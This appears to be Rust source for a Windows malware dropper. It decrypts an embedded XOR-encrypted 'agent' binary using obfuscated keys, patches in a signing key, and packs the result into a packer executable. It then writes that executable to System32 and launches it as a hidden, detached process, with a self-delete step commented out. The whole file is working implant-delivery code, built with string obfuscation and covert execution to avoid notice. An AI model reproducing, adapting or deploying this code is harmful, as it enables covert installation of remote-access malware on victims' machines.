// #![windows_subsystem = "windows"]
use std::os::windows::process::CommandExt;

use common::crypto;
use object::{File, Object, ObjectSection};

const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
const DETACHED_PROCESS: u32 = 0x00000008;
const CREATE_NO_WINDOW: u32 = 0x08000000;

fn get_section(file: &File, name: &str) -> Option<(u64, u64)> {
    file.sections()
        .find(|section| section.name() == Ok(name))
        .map(|section| section.file_range())
        .flatten()
}

fn set_section_data(
    buf: &mut [u8],
    section_name: &str,
    data: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    let file = File::parse(&*buf)?;
    if let Some((offset, size)) = get_section(&file, section_name) {
        // assert_eq!(size, N as u64);
        println!(
            "Setting section data ({}) at offset: {offset}, size: {size}",
            data.len()
        );
        let base = offset as usize;
        buf[base..(base + data.len())].copy_from_slice(data);
    }
    Ok(())
}

fn encrypt_data(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut encrypted_data = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key[i % key.len()];
        encrypted_data.push(byte ^ key_byte);
    }

    encrypted_data
}

fn decrypt_data(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut decrypted_data = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key[i % key.len()];
        decrypted_data.push(byte ^ key_byte);
    }

    decrypted_data
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(unix)]
    {
        eprintln!("This platform is not supported");
        return;
    }

    let mut agent_bin = decrypt_data(
        include_bytes!(concat!(env!("OUT_DIR"), "/enc")),
        obfstr::obfstr!("ABCDEFGHIKLMNOPQRSTVXYZ").as_bytes(),
    );

    set_section_data(
        &mut agent_bin,
        obfstr::obfstr!("secret_key"),
        crypto::get_signing_key().as_bytes(),
    )?;

    let encrypted = encrypt_data(
        &agent_bin,
        obfstr::obfstr!("ABCDEFGHIKLMNOPQRSTVXYZ").as_bytes(),
    );

    #[cfg(debug_assertions)]
    let packer_bytes = include_bytes!("../../target/x86_64-pc-windows-gnu/debug/packer.exe");
    #[cfg(not(debug_assertions))]
    let packer_bytes = include_bytes!("../../target/x86_64-pc-windows-gnu/release/packer.exe");
    let mut packer_bin = packer_bytes.to_vec();

    set_section_data(&mut packer_bin, obfstr::obfstr!("agent"), &encrypted)?;

    std::fs::write(
        obfstr::obfstr!("C:\\Windows\\System32\\agent.exe"),
        packer_bin,
    )?;

    std::process::Command::new("cmd")
        .creation_flags(CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS | CREATE_NO_WINDOW)
        .args(&[
            "/C",
            "start",
            obfstr::obfstr!("C:\\Windows\\System32\\agent.exe"),
        ])
        .spawn()?;

    // self_replace::self_delete()?;
    Ok(())
}
